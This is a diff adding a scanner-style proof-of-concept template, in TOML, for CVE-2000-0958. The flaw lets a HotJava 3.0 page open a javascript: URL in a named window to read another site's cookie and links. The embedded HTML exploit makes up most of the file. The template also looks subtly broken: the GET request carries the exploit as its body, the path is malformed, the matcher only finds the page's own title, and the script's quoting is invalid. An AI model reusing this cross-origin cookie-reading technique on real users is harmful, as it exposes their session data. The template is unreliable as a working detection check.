@@ -1,0 +1,59 @@
+[info]
+author = "ave"
+description = "Sun HotJava Browser 3.0 跨窗口 DOM 未授权访问漏洞验证。远程攻击者通过诱导用户访问恶意页面，利用 JavaScript 在命名窗口中打开 javascript:URL 绕过同源策略，跨域读取目标窗口的 DOM 元素与 Cookie 等敏感信息。"
+id = "POC-AVE-2000-0697"
+name = "CVE-2000-0958 PoC"
+severity = "medium"
+tags = ["ave-2000-0697"]
+vuln_id = [
+    "CVE-2000-0958",
+    "AVE-2000-0697",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2000-0958.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<HTML>
+<HEAD>
+<TITLE>
+Demo - HotJava Browser 3.0 JavaScript security vulnerability
+</TITLE>
+</HEAD>
+<BODY>
+Demo - HotJava Browser 3.0 JavaScript security vulnerability
+<BR>
+This page shows the cookie and the first link from from www.sun.com in 10 seconds
+<BR>
+Written by Georgi Guninski
+<BR>
+<SCRIPT>
+window.open("http://www.sun.com","g");
+setTimeout("window.open('javascript:alert("The first link is: "+document.links[0].href);alert("The cookie is: "+document.cookie)','g')",10000);
+</SCRIPT>
+<center>(C) Copyright 2000 Georgi Guninski</center>
+<BR>
+<center>
+| <a href="http://www.guninski.com">Home</a> |
+<a href="browsers.html">Internet Explorer</a> |
+<a href="win2k.html">Windows 2000</a> |
+<a href="exploit.html">AIX</a> |
+<a href="netscape.html">Netscape</a> |
+<a href="greets.html">Greets</a> |
+<a href="index.html">More</a> |
+</center>
+</BODY>
+</HTML>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["HotJava Browser 3.0 JavaScript security vulnerability"]
